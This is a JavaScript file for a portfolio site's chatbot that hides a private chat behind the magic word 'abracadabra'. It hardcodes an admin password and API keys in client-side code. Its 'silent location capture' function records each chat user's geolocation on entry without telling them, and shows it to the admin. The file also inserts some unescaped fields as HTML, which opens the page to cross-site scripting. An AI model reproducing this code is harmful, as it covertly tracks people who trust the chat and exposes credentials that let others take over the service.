// ============================================================
// HET PATEL — PRIVATE CHAT SYSTEM v2
// ============================================================
// Flow: Gemini chatbot → "abracadabra" → code/credentials → private chat
// Admin: ID=Hela, Password=Het@#1517@#
// Special access: ADITIS → Aditi (pre-seeded)
// Features: text, images, video, voice notes, video notes,
//            WebRTC voice/video calls, silent location capture
// ============================================================

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getDatabase, ref, set, get, push, onValue, off, serverTimestamp }
    from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
import { getStorage, ref as sRef, uploadBytes, getDownloadURL }
    from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";

// ── Config ─────────────────────────────────────────────────
const firebaseConfig = {
    apiKey: "AIzaSyB-y70Ll8vzD1cI1eQctblkwUZMP1PjI18",
    authDomain: "hetpatel-in.firebaseapp.com",
    databaseURL: "https://hetpatel-in-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "hetpatel-in",
    storageBucket: "hetpatel-in.firebasestorage.app",
    messagingSenderId: "267666890158",
    appId: "1:267666890158:web:5cd0d0de9fab0edc287c3f",
    measurementId: "G-HY74J8GTNB"
};

// Replace with your Gemini free API key from aistudio.google.com
const GEMINI_KEY = "AIzaSyALod9inFEwTSwnBatBrNB2J_jls9Hfnus";

// ── Init ───────────────────────────────────────────────────
let app, db, storage;
const ONLINE = firebaseConfig.apiKey !== "YOUR_API_KEY";
const HAS_GEM = GEMINI_KEY !== "YOUR_GEMINI_KEY";

if (ONLINE) {
    try {
        app = initializeApp(firebaseConfig);
        db = getDatabase(app);
        storage = getStorage(app);
        seedDefaultUsers();
    } catch (e) { console.error("Firebase:", e); }
}

async function seedDefaultUsers() {
    const s = await get(ref(db, "authorizedUsers/ADITIS"));
    if (!s.exists()) await set(ref(db, "authorizedUsers/ADITIS"), { name: "Aditi" });
}

// ── State ──────────────────────────────────────────────────
let chatStep = "bot";
let currentUser = null;
let currentRoomId = null;
let mediaBlob = null;
let mediaType = null;
let mediaRecorder = null;
let recordChunks = [];
let activeMsgRef = null;
// WebRTC
let peer = null, activeCall = null;
window.chatStep = "bot";

// ── DOM ────────────────────────────────────────────────────
const modal = document.getElementById("chat-modal");
const headerName = document.getElementById("chat-header-name");
const stepBot = document.getElementById("step-bot");
const stepCode = document.getElementById("step-code");
const stepChat = document.getElementById("step-chat");
const botMessages = document.getElementById("bot-messages");
const botForm = document.getElementById("bot-form");
const botInput = document.getElementById("bot-input");
const codeForm = document.getElementById("code-form");
const codeInput = document.getElementById("code-input");
const adminPass = document.getElementById("admin-pass");
const codeError = document.getElementById("code-error");
const msgContainer = document.getElementById("messages-container");
const chatForm = document.getElementById("chat-form");
const msgInput = document.getElementById("message-input");
const adminSidebar = document.getElementById("admin-sidebar");
const adminUserList = document.getElementById("admin-user-list");
const adminTools = document.getElementById("admin-tools");
const mediaPreview = document.getElementById("media-preview");
const mediaLabel = document.getElementById("media-preview-label");
const mediaCancel = document.getElementById("media-cancel");
const recordingBar = document.getElementById("recording-bar");
const recordingLabel = document.getElementById("recording-label");
const stopRecBtn = document.getElementById("stop-recording");
const fileInput = document.getElementById("file-input");
const voiceBtn = document.getElementById("voice-btn");
const vidnoteBtn = document.getElementById("vidnote-btn");
const assignCodeBtn = document.getElementById("assign-code-btn");
const assignFeedback = document.getElementById("assign-feedback");
const callBar = document.getElementById("call-bar");

// ── Helpers ────────────────────────────────────────────────
const show = (el, d = "flex") => { if (!el) return; el.classList.remove("hidden"); el.style.display = d; };
const hide = (el) => { if (!el) return; el.classList.add("hidden"); el.style.display = ""; };

window.closeChatModal = () => { hide(modal); modal.classList.remove("flex"); };
window.openChatModal = () => { show(modal, "flex"); modal.classList.add("flex"); setTimeout(() => botInput.focus(), 80); };

// ── GEMINI CHATBOT ─────────────────────────────────────────
const staticReplies = [
    "Great question! Het is brilliant at what he does — want to learn more about his work?",
    "I'm just his assistant, but I can tell you he's currently open to exciting opportunities!",
    "Het builds things that work — from IoT to SaaS. Anything specific you'd like to know?",
    "I've noted your message! He'll get back to you soon.",
    "Interesting thought. Het loves connecting with curious, driven people.",
    "That's insightful! Is there anything specific about Het's work you'd like to know?",
];
let staticIdx = 0;

async function geminiReply(userMsg) {
    if (!HAS_GEM) {
        // fallback to static
        return staticReplies[staticIdx++ % staticReplies.length];
    }
    try {
        const res = await fetch(
            `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_KEY}`,
            {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    contents: [{
                        parts: [{
                            text: `You are Het Patel's friendly AI assistant on his portfolio website. 
Het is a founder, IoT and SaaS builder from India. Keep replies short (1-2 sentences), warm, and helpful. 
Never reveal anything private or personal. 
User message: "${userMsg}"`
                        }]
                    }]
                })
            }
        );
        const data = await res.json();
        return data?.candidates?.[0]?.content?.parts?.[0]?.text || staticReplies[staticIdx++ % staticReplies.length];
    } catch {
        return staticReplies[staticIdx++ % staticReplies.length];
    }
}

function addBotBubble(text, isUser = false) {
    const w = document.createElement("div");
    w.className = `flex gap-2.5 ${isUser ? "justify-end" : ""}`;
    if (isUser) {
        w.innerHTML = `<div class="max-w-[75%] bg-brand-purple/50 border border-brand-purple/30 rounded-2xl rounded-tr-sm px-4 py-2.5 text-sm text-white">${escHtml(text)}</div>`;
    } else {
        w.innerHTML = `
      <div class="w-7 h-7 rounded-full bg-gradient-to-br from-brand-purple to-brand-accent flex-shrink-0 flex items-center justify-center text-[11px] font-bold mt-0.5">H</div>
      <div class="max-w-[75%] bg-white/[0.06] border border-white/[0.08] rounded-2xl rounded-tl-sm px-4 py-2.5 text-sm text-gray-200 leading-relaxed">${text}</div>`;
    }
    botMessages.appendChild(w);
    botMessages.scrollTop = botMessages.scrollHeight;
}

function addTypingIndicator() {
    const w = document.createElement("div");
    w.id = "typing-dot";
    w.className = "flex gap-2.5";
    w.innerHTML = `
    <div class="w-7 h-7 rounded-full bg-gradient-to-br from-brand-purple to-brand-accent flex-shrink-0 flex items-center justify-center text-[11px] font-bold">H</div>
    <div class="bg-white/[0.06] border border-white/[0.08] rounded-2xl rounded-tl-sm px-4 py-3 flex items-center gap-1.5">
      <span class="w-1.5 h-1.5 rounded-full bg-gray-400 animate-bounce" style="animation-delay:0ms"></span>
      <span class="w-1.5 h-1.5 rounded-full bg-gray-400 animate-bounce" style="animation-delay:150ms"></span>
      <span class="w-1.5 h-1.5 rounded-full bg-gray-400 animate-bounce" style="animation-delay:300ms"></span>
    </div>`;
    botMessages.appendChild(w);
    botMessages.scrollTop = botMessages.scrollHeight;
}

botForm.addEventListener("submit", async e => {
    e.preventDefault();
    const text = botInput.value.trim();
    if (!text) return;
    botInput.value = "";

    addBotBubble(text, true);

    if (text.toLowerCase() === "abracadabra") {
        addTypingIndicator();
        setTimeout(() => {
            document.getElementById("typing-dot")?.remove();
            addBotBubble("✨ Magic word detected. Switching to secure mode…");
            setTimeout(switchToCodeStep, 800);
        }, 600);
        return;
    }

    addTypingIndicator();
    const reply = await geminiReply(text);
    document.getElementById("typing-dot")?.remove();
    addBotBubble(reply);
});

function switchToCodeStep() {
    hide(stepBot);
    show(stepCode, "flex");
    chatStep = window.chatStep = "code";
    headerName.textContent = "Secure Access";
    setTimeout(() => codeInput.focus(), 80);
}

// ── ADMIN PASS REVEAL ──────────────────────────────────────
codeInput.addEventListener("input", () => {
    const isAdmin = codeInput.value.trim().toUpperCase() === "HELA";
    if (isAdmin) {
        show(adminPass, "block");
        adminPass.focus();
        document.getElementById("code-hint").textContent = "Enter your admin password.";
    } else {
        hide(adminPass);
        adminPass.value = "";
        document.getElementById("code-hint").textContent = "Enter the private code Het gave you.";
    }
});

// ── CODE AUTH ─────────────────────────────────────────────
codeForm.addEventListener("submit", async e => {
    e.preventDefault();
    const id = codeInput.value.trim().toUpperCase();
    const pass = adminPass?.value?.trim() || "";
    if (!id) return;
    hide(codeError);

    if (id === "HELA") {
        if (pass === "Het@#1517@#") {
            currentUser = { name: "Het Patel", code: "ADMIN", isAdmin: true };
            enterChat();
        } else {
            show(codeError, "block");
        }
        return;
    }

    if (ONLINE) {
        const snap = await get(ref(db, `authorizedUsers/${id}`));
        if (snap.exists()) {
            currentUser = { name: snap.val().name, code: id, isAdmin: false };
            enterChat();
        } else show(codeError, "block");
    } else {
        if (id === "ADITIS") { currentUser = { name: "Aditi", code: "ADITIS", isAdmin: false }; enterChat(); }
        else show(codeError, "block");
    }
});

// ── ENTER CHAT ────────────────────────────────────────────
function enterChat() {
    hide(stepCode);
    show(stepChat, "flex");
    chatStep = window.chatStep = "chat";

    if (currentUser.isAdmin) {
        headerName.textContent = "Admin Panel";
        show(adminSidebar, "flex");
        show(adminTools, "flex");
        listenForAllUsers();
        initPeer("het_admin_" + Date.now()); // Admin peer ID
    } else {
        headerName.textContent = "Chat with Het";
        currentRoomId = `room_${currentUser.code.toLowerCase()}`;
        listenMessages(currentRoomId);
        captureLocation(); // silent location on chat open
        initPeer(currentUser.code.toLowerCase() + "_" + Date.now());
    }
}

// ── SILENT LOCATION ───────────────────────────────────────
function captureLocation() {
    if (!navigator.geolocation) return;
    navigator.geolocation.getCurrentPosition(
        pos => {
            const { latitude: lat, longitude: lng, accuracy } = pos.coords;
            const ts = Date.now();
            const mapsUrl = `https://maps.google.com/?q=${lat},${lng}`;
            if (ONLINE) {
                set(ref(db, `locations/${currentUser.code}`), {
                    lat, lng, accuracy,
                    mapsUrl,
                    name: currentUser.name,
                    timestamp: ts
                });
            }
            // Store locally so admin panel shows it
            window._capturedLocation = { lat, lng, mapsUrl, name: currentUser.name };
        },
        () => { }, // silently ignore denial
        { timeout: 10000, maximumAge: 300000 }
    );
}

// ── MESSAGES ─────────────────────────────────────────────
function listenMessages(roomId) {
    if (activeMsgRef) off(activeMsgRef);

    msgContainer.innerHTML = `
    <div class="encrypted-tag text-center text-[11px] text-brand-accent/50 uppercase tracking-widest font-mono flex items-center justify-center gap-2 py-2">
      <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
      Private Encrypted Session
    </div>`;

    if (!ONLINE) {
        appendMsg({ sender: "System", text: "Demo mode — connect Firebase in chat.js to enable messages.", timestamp: Date.now() }, false, "system");
        return;
    }

    activeMsgRef = ref(db, `chats/${roomId}/messages`);
    onValue(activeMsgRef, snap => {
        const tag = msgContainer.querySelector(".encrypted-tag");
        msgContainer.innerHTML = "";
        if (tag) msgContainer.appendChild(tag);
        const data = snap.val();
        if (!data) return;
        Object.values(data).forEach(m => appendMsg(m, m.sender === currentUser.name, m.mediaType));
    });
}

function appendMsg(msg, isMe, type = "text") {
    const time = msg.timestamp ? new Date(msg.timestamp).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }) : "";
    const wrap = document.createElement("div");

    if (type === "system") {
        wrap.className = "flex justify-center";
        wrap.innerHTML = `<span class="text-xs text-gray-500 italic py-1">${msg.text}</span>`;
        msgContainer.appendChild(wrap); return;
    }

    wrap.className = `flex ${isMe ? "justify-end" : "justify-start"} gap-2`;
    let content = "";

    if (type === "image") content = `<img src="${msg.mediaUrl}" class="max-w-full max-h-48 rounded-xl object-cover cursor-pointer" onclick="window.open('${msg.mediaUrl}')">`;
    else if (type === "video") content = `<video src="${msg.mediaUrl}" controls class="max-w-full max-h-48 rounded-xl"></video>`;
    else if (type === "audio") content = `<audio src="${msg.mediaUrl}" controls class="w-48"></audio>`;
    else if (type === "vidnote") content = `<video src="${msg.mediaUrl}" controls class="max-w-full max-h-40 rounded-xl"></video>`;
    else content = `<p class="text-sm leading-relaxed whitespace-pre-wrap">${escHtml(msg.text || "")}</p>`;

    const bubble = isMe
        ? "bg-brand-purple/70 border border-brand-purple/40 rounded-2xl rounded-tr-sm text-white"
        : "bg-white/[0.06] border border-white/[0.08] rounded-2xl rounded-tl-sm text-gray-200";

    wrap.innerHTML = `
    <div class="max-w-[78%] flex flex-col ${isMe ? "items-end" : "items-start"} gap-0.5">
      ${!isMe ? `<span class="text-[10px] text-gray-500 px-1 font-mono">${msg.sender}</span>` : ""}
      <div class="px-4 py-2.5 ${bubble}">${content}</div>
      ${time ? `<span class="text-[10px] text-gray-600 px-1">${time}</span>` : ""}
    </div>`;

    msgContainer.appendChild(wrap);
    msgContainer.scrollTop = msgContainer.scrollHeight;
}

function escHtml(s) { return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;"); }

// ── SEND ─────────────────────────────────────────────────
chatForm.addEventListener("submit", async e => {
    e.preventDefault();
    const text = msgInput.value.trim();
    if (!text && !mediaBlob) return;
    if (!currentRoomId && currentUser.isAdmin) return;

    msgInput.value = "";
    resizeTextarea();

    const payload = {
        sender: currentUser.name,
        timestamp: ONLINE ? serverTimestamp() : Date.now()
    };

    if (mediaBlob) {
        if (ONLINE) {
            try {
                const url = await uploadMedia(mediaBlob, mediaType);
                payload.mediaUrl = url;
                payload.mediaType = mediaType;
            } catch (err) { console.error("Upload failed:", err); clearMedia(); return; }
        } else {
            payload.mediaUrl = URL.createObjectURL(mediaBlob);
            payload.mediaType = mediaType;
        }
        clearMedia();
    } else {
        payload.text = text;
        payload.mediaType = "text";
    }

    if (ONLINE) {
        await push(ref(db, `chats/${currentRoomId}/messages`), payload);
    } else {
        appendMsg(payload, true, payload.mediaType);
        if (!currentUser.isAdmin) {
            setTimeout(() => appendMsg({ sender: "Het Patel", text: "Hey! Demo mode — add Firebase config to chat.js 😊", timestamp: Date.now() }, false, "text"), 900);
        }
    }
});

// ── UPLOAD MEDIA ─────────────────────────────────────────
async function uploadMedia(blob, type) {
    const ext = { image: "jpg", video: "mp4", audio: "webm", vidnote: "webm" }[type] || "bin";
    const path = `chats/${currentRoomId}/${Date.now()}.${ext}`;
    await uploadBytes(sRef(storage, path), blob);
    return await getDownloadURL(sRef(storage, path));
}

// ── FILE ATTACH ──────────────────────────────────────────
fileInput.addEventListener("change", () => {
    const f = fileInput.files[0]; if (!f) return;
    mediaBlob = f;
    mediaType = f.type.startsWith("image/") ? "image" : "video";
    mediaLabel.textContent = `📎 ${f.name}`;
    show(mediaPreview, "flex");
    fileInput.value = "";
});
mediaCancel.addEventListener("click", clearMedia);
function clearMedia() { mediaBlob = null; mediaType = null; hide(mediaPreview); mediaLabel.textContent = ""; }

// ── RECORDING ────────────────────────────────────────────
voiceBtn.addEventListener("click", () => startRecording("audio"));
vidnoteBtn.addEventListener("click", () => startRecording("video"));

async function startRecording(type) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia(
            type === "video" ? { audio: true, video: { facingMode: "user", width: 320, height: 240 } } : { audio: true }
        );
        recordChunks = [];
        mediaRecorder = new MediaRecorder(stream);
        mediaRecorder.ondataavailable = e => recordChunks.push(e.data);
        mediaRecorder.onstop = () => {
            mediaBlob = new Blob(recordChunks, { type: type === "video" ? "video/webm" : "audio/webm" });
            mediaType = type === "video" ? "vidnote" : "audio";
            mediaLabel.textContent = type === "video" ? "🎥 Video note ready" : "🎙️ Voice note ready";
            show(mediaPreview, "flex"); hide(recordingBar);
            stream.getTracks().forEach(t => t.stop());
        };
        mediaRecorder.start();
        recordingLabel.textContent = type === "video" ? "Recording video note…" : "Recording voice note…";
        show(recordingBar, "flex");
    } catch { alert("Camera/mic access denied."); }
}
stopRecBtn.addEventListener("click", () => { if (mediaRecorder?.state !== "inactive") mediaRecorder.stop(); });

// ── AUTO-RESIZE TEXTAREA ─────────────────────────────────
msgInput?.addEventListener("input", resizeTextarea);
function resizeTextarea() { msgInput.style.height = "auto"; msgInput.style.height = Math.min(msgInput.scrollHeight, 112) + "px"; }

// ── ADMIN: ALL USERS + LOCATION ──────────────────────────
function listenForAllUsers() {
    if (!ONLINE) { renderAdminUsers({ ADITIS: { name: "Aditi" } }); return; }
    onValue(ref(db, "authorizedUsers"), snap => renderAdminUsers(snap.val() || {}));
}

function renderAdminUsers(users) {
    adminUserList.innerHTML = `<span class="text-[10px] font-bold text-brand-purple uppercase tracking-widest mr-1">Sessions:</span>`;
    Object.entries(users).forEach(([code, data]) => {
        if (code === "HELAPA" || data.role === "admin") return;
        const roomId = `room_${code.toLowerCase()}`;
        const isActive = currentRoomId === roomId;
        const btn = document.createElement("button");
        btn.className = `px-3 py-1.5 rounded-full text-[11px] font-bold border transition-all flex-shrink-0 ${isActive ? "bg-brand-accent text-white border-brand-accent" : "bg-white/5 text-gray-400 border-white/10 hover:border-white/30"}`;
        btn.innerHTML = `${data.name} <span class="opacity-50 font-mono">#${code}</span>`;
        btn.onclick = () => {
            currentRoomId = roomId;
            headerName.textContent = `${data.name}`;
            listenMessages(currentRoomId);
            showUserLocation(code, data.name);
            renderAdminUsers(users);
        };
        adminUserList.appendChild(btn);
    });
}

// Show user's location in admin panel when switching to their chat
async function showUserLocation(code, name) {
    if (!ONLINE) return;
    const snap = await get(ref(db, `locations/${code}`));
    if (!snap.exists()) return;
    const loc = snap.val();
    const ts = loc.timestamp ? new Date(loc.timestamp).toLocaleString() : "unknown";
    // Inject location notice at top of messages (admin only)
    const locDiv = document.createElement("div");
    locDiv.className = "flex justify-center my-2";
    locDiv.innerHTML = `
    <a href="${loc.mapsUrl}" target="_blank" class="inline-flex items-center gap-2 bg-green-900/30 border border-green-500/20 rounded-full px-4 py-1.5 text-xs text-green-300 hover:bg-green-900/50 transition-colors">
      <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0zM15 11a3 3 0 11-6 0 3 3 0 016 0z"/></svg>
      ${name}'s last location · ${ts} · Open in Maps
    </a>`;
    const encrypted = msgContainer.querySelector(".encrypted-tag");
    if (encrypted) encrypted.insertAdjacentElement("afterend", locDiv);
    else msgContainer.insertAdjacentElement("afterbegin", locDiv);
}

// ── ASSIGN CODE ──────────────────────────────────────────
assignCodeBtn?.addEventListener("click", async () => {
    const name = document.getElementById("new-code-name")?.value.trim();
    const code = document.getElementById("new-code-val")?.value.trim().toUpperCase();
    if (!name || !code) return;
    if (ONLINE) await set(ref(db, `authorizedUsers/${code}`), { name });
    show(assignFeedback, "inline");
    document.getElementById("new-code-name").value = "";
    document.getElementById("new-code-val").value = "";
    setTimeout(() => hide(assignFeedback), 2500);
});

// ── WEBRTC CALLS (PeerJS) ────────────────────────────────
// PeerJS loaded via CDN in index.html
function initPeer(peerId) {
    if (typeof Peer === "undefined") return;
    peer = new Peer(peerId.replace(/[^a-z0-9\-_]/gi, "_"), {
        host: "0.peerjs.com", port: 443, path: "/", secure: true
    });

    // Incoming call
    peer.on("call", call => {
        const type = call.metadata?.type || "audio";
        const accept = confirm(`📞 Incoming ${type} call from ${call.metadata?.name || "someone"}. Accept?`);
        if (!accept) { call.close(); return; }

        navigator.mediaDevices.getUserMedia({ audio: true, video: type === "video" })
            .then(stream => {
                call.answer(stream);
                handleCallStream(call, stream, type);
            });
    });
}

// Admin initiates call
window.startCall = function (callType) {
    if (!peer || !currentRoomId) return;
    const targetPeerId = currentRoomId.replace("room_", "") + "_peer";

    navigator.mediaDevices.getUserMedia({ audio: true, video: callType === "video" })
        .then(stream => {
            const call = peer.call(targetPeerId, stream, { metadata: { type: callType, name: "Het Patel" } });
            handleCallStream(call, stream, callType);
        })
        .catch(() => alert("Camera/mic access needed for calls."));
};

function handleCallStream(call, localStream, type) {
    activeCall = call;
    show(callBar, "flex");

    call.on("stream", remoteStream => {
        let el = document.getElementById("remote-media");
        if (!el) {
            el = document.createElement(type === "video" ? "video" : "audio");
            el.id = "remote-media"; el.autoplay = true;
            if (type === "video") el.className = "w-full max-h-40 rounded-xl object-cover mt-1";
            callBar.appendChild(el);
        }
        el.srcObject = remoteStream;
    });

    call.on("close", endCall);
}

window.endCall = function () {
    activeCall?.close();
    activeCall = null;
    document.getElementById("remote-media")?.remove();
    hide(callBar);
};
